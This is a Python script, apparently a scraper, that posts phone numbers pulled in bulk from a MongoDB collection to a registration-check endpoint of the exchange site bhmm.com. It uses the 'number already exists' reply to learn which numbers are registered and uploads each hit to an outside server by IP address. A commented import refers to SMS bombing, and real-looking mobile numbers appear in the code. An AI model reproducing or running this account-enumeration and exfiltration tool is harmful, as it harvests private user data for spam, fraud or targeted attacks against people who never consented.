# coding:utf-8
import requests
# from 短信轰炸.number_mongo import number_six
# from number_mongo import number_BaFangZiYuan
from pymongo import MongoClient
connection=MongoClient('localhost',27017)
dbdb=connection['dbdb']



def check_number(number):
    headers = {'Host': 'www.bhmm.com', 'Connection': 'keep-alive', 'Content-Length': '37', 'Pragma': 'no-cache',
               'Cache-Control': 'no-cache', 'Accept': 'application/json, text/javascript, */*; q=0.01',
               'Origin': 'https://www.bhmm.com', 'X-Requested-With': 'XMLHttpRequest',
               'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36',
               'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
               'Referer': 'https://www.bhmm.com/reg', 'Accept-Encoding': 'gzip, deflate, br',
               'Accept-Language': 'zh-CN,zh;q=0.9',
               'Cookie': 'PHPSESSID=625e8fh8ec3nm4rr49k6vu7c62; lang=cn; Hm_lvt_a9eb43a49dc5e02489aa19ee0e4b39ac=1529656444; __lnkrntdmcvrd=-1; Hm_lpvt_a9eb43a49dc5e02489aa19ee0e4b39ac=1529656448'}

    url = "https://www.bhmm.com/reg/check_moble.html"
    form_data = [('mobles', "+86"),
                 ('moble', str(number)),
                 ('token', ""),
                 ]

    page = requests.post(url, headers=headers, data=form_data).text
    print(page)
    return str(eval(page))


def save_success_number(number):
    with open("success_币虎网.txt", "a+")as f:
        f.write(str(number) + "\n")


def save_faile_number(number):
    with open("faile_币虎网.txt", "a+")as f:
        f.write(str(number) + "\n")


def save(number):
    url ="http://122.114.183.102:8080/saveNumber/{0}/".format(number,)
    print(requests.get(url).text)


if __name__ == "__main__":
    # count = 0
    # while True:
    #     try:
    #         with open("flag_币虎网.txt")as f:
    #             count = int(f.read())
    #         for res in number_BaFangZiYuan.find({'_id': count}):
    #             line = res["number"].replace("\n", "")
    #             print(line, count)
    #             count += 1
    #             result = check_number(line)
    #             print(result)
    #             if str(result).find("手机号码已存在") != -1:
    #                 save_success_number(number=line)
    #                 save(number=line)
    #             else:
    #                 save_faile_number(number=line)
    #         with open("flag_币虎网.txt", "w")as f:
    #             f.write(str(count))
    #     except:
    #         pass
    check_number("13247785048")


# {"info":"\u624b\u673a\u53f7\u7801\u5df2\u5b58\u5728","status":"0","url":""}
# {'info': '手机号码已存在', 'status': '0', 'url': ''}
# {'info': '不存在', 'status': 1, 'url': ''}
"""
13728776908
"""
